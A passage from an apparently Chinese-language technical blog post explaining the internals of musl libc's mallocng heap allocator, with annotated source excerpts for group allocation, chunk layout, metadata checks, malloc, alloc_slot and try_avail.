+= IB + UNIT;</span><br><span class="line">        req += -req &amp; (pagesize - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (req &lt; size + UNIT || (req &gt;= <span class="number">4</span> * pagesize &amp;&amp; <span class="number">2</span> * cnt &gt; usage)) &#123;</span><br><span class="line">            cnt = <span class="number">1</span>;</span><br><span class="line">            needed = req;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = mmap(<span class="number">0</span>, needed, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) &#123;</span><br><span class="line">        free_meta(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    m-&gt;maplen = needed &gt;&gt; <span class="number">12</span>;</span><br><span class="line">    ctx.mmap_counter++;</span><br><span class="line">    active_idx = (<span class="number">4096</span> - UNIT) / size - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (active_idx &gt; cnt - <span class="number">1</span>) active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (active_idx &lt; <span class="number">0</span>) active_idx = <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>如果所需内存不超过页大小的一半则在再申请一个所需大小的 chunk，然后在其中构造 <code>group</code> 。与正常申请不同的是这里直接调用 <code>alloc_slot</code> 获取 chunk 的下标，不过和正常申请实际是一样的。在申请的 chunk 的头部要打上标记（<code>p[-3] = (p[-3] &amp; 31) | (6 &lt;&lt; 5)</code>）。最后再将 <code>group</code> 中的每个 chunk 的 <code>p[-4]</code> 处置零。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="type">int</span> j = size_to_class(UNIT + cnt * size - IB);</span><br><span class="line">    <span class="type">int</span> idx = alloc_slot(j, UNIT + cnt * size - IB);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        free_meta(m);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> ctx.active[j];</span><br><span class="line">    p = enframe(g, idx, UNIT * size_classes[j] - IB, ctx.mmap_counter);</span><br><span class="line">    m-&gt;maplen = <span class="number">0</span>;</span><br><span class="line">    p[<span class="number">-3</span>] = (p[<span class="number">-3</span>] &amp; <span class="number">31</span>) | (<span class="number">6</span> &lt;&lt; <span class="number">5</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= cnt; i++)</span><br><span class="line">        p[UNIT + i * size - <span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    active_idx = cnt - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最后更新 <code>meta</code> 和 <code>group</code> 的相关字段，从这里可以看到，有的 chunk 对应的 <code>freed_mask</code> 被置 1 ，这些 chunk 暂时参与不到内存分配中。最后将管理申请到的 <code>group</code> 的 <code>meta</code> 返回。 </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ctx.usage_by_class[sc] += cnt;</span><br><span class="line">m-&gt;avail_mask = (<span class="number">2u</span> &lt;&lt; active_idx) - <span class="number">1</span>;</span><br><span class="line">m-&gt;freed_mask = (<span class="number">2u</span> &lt;&lt; (cnt - <span class="number">1</span>)) - <span class="number">1</span> - m-&gt;avail_mask;</span><br><span class="line">m-&gt;mem = (<span class="type">void</span> *) p;</span><br><span class="line">m-&gt;mem-&gt;meta = m;</span><br><span class="line">m-&gt;mem-&gt;active_idx = active_idx;</span><br><span class="line">m-&gt;last_idx = cnt - <span class="number">1</span>;</span><br><span class="line">m-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">m-&gt;sizeclass = sc;</span><br><span class="line"><span class="keyword">return</span> m;</span><br></pre></td></tr></table></figure></div>

<h3 id="chunk-1"><a href="#chunk-1" class="headerlink" title="chunk"></a>chunk</h3><p>musl heap 中的 chunk 没有具体定义，但是根据程序可以分析出 chunk 的结构：</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">chunk</span> &#123;</span><br><span class="line">	<span class="type">uint32_t</span> offset_32;</span><br><span class="line">	<span class="type">uint8_t</span> use_32_offset;</span><br><span class="line">    <span class="type">uint8_t</span> inedx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">uint8_t</span> flag:<span class="number">3</span>;</span><br><span class="line">	<span class="type">uint16_t</span> offset_16;</span><br><span class="line">	<span class="type">char</span> user_data[]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于一般 <code>offset_32</code> 不使用，因此 <code>chunk</code> 结构如下图所示。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/musl-pwn/images/22e90e1117987faad801124b877f3080.png"
                     
                ></p>
<ul>
<li><code>offset_32</code> 和 <code>offset_16</code> 都表示 <code>chunk</code> 的 <code>user_data</code> 与所在 <code>group</code> 的 <code>storage</code> 之间的偏移除以 16 ，只不过一个用 32 比特存储一个用 16 比特存储。当申请的 <code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的 <code>chunk</code> 的 <code>offset</code> 为与内部 <code>chunk</code> 的偏移除以 16 。当 <code>chunk</code> 被 free 掉时 <code>offset</code> 被置 0 。</li>
<li><code>use_32_offset</code> 表示是否用 <code>offset_32</code> 存储偏移。</li>
<li><code>flag</code> 是 <code>chunk</code> 的标志位。当申请的 <code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的 <code>chunk</code> 的 <code>flag</code> 为 7 ， 当申请的 <code>chunk</code> 作为 <code>group</code> 时该 <code>chunk</code> 的 <code>flag</code> 为 6 。正常申请出的 chunk ，该值为 <code>reserved</code> ，其中 <code>reserved</code> 为 <code>user_data</code> 到 <code>chunk</code> 结束位置的距离减去用户申请的内存大小与 5 取 min 的结果。如果 <code>chunk</code> 被 free 掉则 <code>flag</code> 和 <code>index</code> 一并置为 0xFF 。</li>
<li><code>index</code> 表示该 <code>chunk</code> 在 <code>group</code> 中的下标。当申请的 <code>chunk</code> 为该 <code>chunk</code> 内部的一块空间则外部的 <code>chunk</code> 的 <code>index</code> 为 0 ，内部 <code>chunk</code> 的 <code>index</code> 为外部 <code>chunk</code> 在 <code>group</code> 中的下标。</li>
</ul>
<h4 id="get-slot-index"><a href="#get-slot-index" class="headerlink" title="get_slot_index"></a>get_slot_index</h4><p>获取 <code>chunk</code> 的 <code>index</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">get_slot_index</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> p[<span class="number">-3</span>] &amp; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="get-nominal-size"><a href="#get-nominal-size" class="headerlink" title="get_nominal_size"></a>get_nominal_size</h4><p>获取 <code>chunk</code> 中 <code>user_data</code> 的大小 ，具体原理见下面对 <code>enframe</code> 和 <code>set_size</code> 函数的分析。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">size_t</span> <span class="title function_">get_nominal_size</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *end)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> reserved = p[<span class="number">-3</span>] &gt;&gt; <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">if</span> (reserved &gt;= <span class="number">5</span>) &#123;</span><br><span class="line">        assert(reserved == <span class="number">5</span>);</span><br><span class="line">        reserved = *(<span class="type">const</span> <span class="type">uint32_t</span> *) (end - <span class="number">4</span>);</span><br><span class="line">        assert(reserved &gt;= <span class="number">5</span>);</span><br><span class="line">        assert(!end[<span class="number">-5</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(reserved &lt;= end - p);</span><br><span class="line">    assert(!*(end - reserved));</span><br><span class="line">    <span class="comment">// also check the slot&#x27;s overflow byte</span></span><br><span class="line">    assert(!*end);</span><br><span class="line">    <span class="keyword">return</span> end - reserved - p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="get-meta"><a href="#get-meta" class="headerlink" title="get_meta"></a>get_meta</h4><p>首先获取 <code>chunk</code> 的 <code>offset</code> 和 <code>index</code> ，然后根据 <code>offset</code> 得到 <code>chunk</code> 对应 <code>group</code> 的地址，之后根据 <code>group</code> 获得 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">assert(!((<span class="type">uintptr_t</span>) p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *) (p - <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">    assert(!offset);</span><br><span class="line">    offset = *(<span class="type">uint32_t</span> *) (p - <span class="number">8</span>);</span><br><span class="line">    assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *) (p - UNIT * offset - UNIT);</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br></pre></td></tr></table></figure></div>

<p>之后对 <code>meta</code> 和 <code>chunk</code> 进行相关检查，防止伪造 chunk 。通过检查后返回得到的 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assert(meta-&gt;mem == base);</span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span> &lt;&lt; index)));</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *) ((<span class="type">uintptr_t</span>) meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">    assert(offset &gt;= size_classes[meta-&gt;sizeclass] * index);</span><br><span class="line">    assert(offset &lt; size_classes[meta-&gt;sizeclass] * (index + <span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">    assert(offset &lt;= meta-&gt;maplen * <span class="number">4096UL</span> / UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> meta *) meta;</span><br></pre></td></tr></table></figure></div>

<h2 id="函数分析-1"><a href="#函数分析-1" class="headerlink" title="函数分析"></a>函数分析</h2><h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><p>首先检查申请的内存是否溢出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果申请的内存大于 131052 字节则采用直接 mmap 的方式申请。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">    <span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">    <span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    wrlock();</span><br><span class="line">    step_seq();</span><br><span class="line">    g = alloc_meta();</span><br><span class="line">    <span class="keyword">if</span> (!g) &#123;</span><br><span class="line">        unlock();</span><br><span class="line">        munmap(p, needed);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    g-&gt;mem = p;</span><br><span class="line">    g-&gt;mem-&gt;meta = g;</span><br><span class="line">    g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">    g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">    g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">    g-&gt;maplen = (needed + <span class="number">4095</span>) / <span class="number">4096</span>;</span><br><span class="line">    g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">    <span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">    ctx.mmap_counter++;</span><br><span class="line">    idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>否则先计算出申请的内存大小所在的组并取出对应组的 deque 中 <code>ctx.active[sc]</code> 指向的那个 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">g = ctx.active[sc];</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>size_to_class</code> 定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span> &#123;</span><br><span class="line">    n = (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="type">int</span> i = (<span class="number">28</span> - a_clz_32(n)) * <span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i + <span class="number">1</span>]) i += <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &gt; size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>该代码等价于下面的 C++ 代码，只不过根据数据特性进行了复杂度的优化。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::<span class="built_in">lower_bound</span>(size_classes, size_classes + <span class="number">48</span>, (n + IB - <span class="number">1</span>) &gt;&gt; <span class="number">4</span>) - size_classes;</span><br></pre></td></tr></table></figure></div>

<p>对应组的 deque 为空则根据经验进行一些调整。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc &gt;= <span class="number">4</span> &amp;&amp; sc &lt; <span class="number">32</span> &amp;&amp; sc != <span class="number">6</span> &amp;&amp; !(sc &amp; <span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">    <span class="type">size_t</span> usage = ctx.usage_by_class[sc | <span class="number">1</span>];</span><br><span class="line">    <span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">    <span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">    <span class="keyword">if</span> (!ctx.active[sc | <span class="number">1</span>] || (!ctx.active[sc | <span class="number">1</span>]-&gt;avail_mask &amp;&amp; !ctx.active[sc | <span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">        usage += <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">        sc |= <span class="number">1</span>;</span><br><span class="line">    g = ctx.active[sc];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后从尝试在该 <code>meta</code> 中获取一个空闲 chunk 的下标，如果成功则更新 <code>avail_mask</code> 后直接跳转到 <code>success</code> 否则跳出循环。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">    first = mask &amp; -mask;</span><br><span class="line">    <span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">        g-&gt;avail_mask = mask - first;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask - first) != mask)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    idx = a_ctz_32(first);</span><br><span class="line">    <span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br></pre></td></tr></table></figure></div>

<p>如果 <code>meta</code> 没有空闲 chunk 则调用 <code>alloc_slot</code> 获取一个有空闲 chunk 的 <code>meta</code> 然后让 <code>ctx.active</code> 对应的 deque 头指向这个 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">idx = alloc_slot(sc, n);</span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g = ctx.active[sc];</span><br></pre></td></tr></table></figure></div>

<p>最后如果成功获取空闲 chunk 的下标则调用 <code>enframe</code> 函数将该 chunk 取出。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">success:</span><br><span class="line">    ctr = ctx.mmap_counter;</span><br><span class="line">    unlock();</span><br><span class="line">    <span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br></pre></td></tr></table></figure></div>

<h3 id="alloc-slot"><a href="#alloc-slot" class="headerlink" title="alloc_slot"></a>alloc_slot</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">alloc_slot</span><span class="params">(<span class="type">int</span> sc, <span class="type">size_t</span> req)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">    <span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">    <span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    g-&gt;avail_mask--;</span><br><span class="line">    <span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>首先调用 <code>try_avail</code> 获取一个有空闲 chunk 的 <code>meta</code> 然后让让 <code>ctx.active</code> 对应的 deque 头指向这个 <code>meta</code> ，否则调用 <code>alloc_group</code> 申请一个新的 <code>group</code> 并且将这个 <code>group</code> 对应的 <code>meta</code> 加入到 deque 中（此时 deque 中就这一个 <code>meta</code> 因此 <code>ctx.active</code> 对应的 deque 头指向这个 <code>meta</code> ）。</p>
<h3 id="try-avail"><a href="#try-avail" class="headerlink" title="try_avail"></a>try_avail</h3><p>首先如果 deque 为空则直接返回 0 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line"><span class="type">uint32_t</span> first;</span><br><span class="line"><span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure></div>

<p>如果没有可用的 chunk 则尝试获取一个有可用 chunk 的 <code>meta</code> 并将它连到 deque 头，最后从其中获取一个下标最小的可用 chunk 更新 <code>avail_mask</code> 并返回下标。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line"><span class="keyword">if</span> (!mask) &#123;...&#125;</span><br><span class="line">first = mask &amp; -mask;</span><br><span class="line">m-&gt;avail_mask = mask - first;</span><br><span class="line"><span class="keyword">return</span> first;</span><br></pre></td></tr></table></figure></div>

<p>如果当前的 <code>meta</code> 既没有空闲的 chunk 也没有释放的 chunk 则直接将该 <code>meta</code> 从 deque 中取出。为了充分利用空闲的 chunk ，无论当前 <code>meta</code> 有没有释放的 chunk 都会将 deque 的头指向下一个 <code>meta</code> 。另外如果 deque 为空会返回 0 。如果是正常情况如果有下一个 <code>meta</code> 则下一个 <code>meta</code> 一定会有可用或释放的 chunk 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">    dequeue(pm, m);</span><br><span class="line">    m = *pm;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    m = m-&gt;next;</span><br><span class="line">    *pm = m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果下一个 <code>meta</code> 全部都是释放的 chunk 那么本着充分利用空闲 chunk 的原则会将 deque 的头指向下一个 <code>meta</code> 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mask = m-&gt;freed_mask;</span><br><span class="line"></span><br><span class="line"><span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line"><span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line"><span class="keyword">if</span> (mask == (<span class="number">2u</span> &lt;&lt; m-&gt;last_idx) - <span class="number">1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">    m = m-&gt;next;</span><br><span class="line">    *pm = m;</span><br><span class="line">    mask = m-&gt;freed_mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>如果当前 chunk 的 <code>active_idx</code> 范围内没有释放的 chunk 则尽可能选择下一个 chunk 否则根据经验扩大 <code>active_idx</code> 的范围，最后调用 <code>activate_group</code> 函数将 <code>active_idx</code> 范围内释放的 chunk 转换为空闲的 chunk。</p>
